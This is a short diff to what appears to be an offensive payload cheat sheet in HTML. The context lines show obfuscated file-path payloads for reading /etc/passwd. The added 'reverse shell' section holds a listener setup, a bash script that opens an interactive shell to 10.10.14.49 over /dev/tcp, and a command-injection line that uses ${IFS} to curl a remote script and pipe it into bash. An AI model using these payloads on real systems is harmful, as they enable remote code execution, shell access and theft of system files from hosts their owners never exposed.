@@ -20,6 +20,14 @@ file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
 file:///etc/passwd?/../passwd
 </code></pre>
 
+<h3>reverse shell</h3>
+<pre><code>
+python3 -m http.server 7000
+nc -lnvp 4444
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > revtest.sh
+test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
+
+</code></pre>
 <h3>URL HTTP payload</h3>
 <pre><code>
 
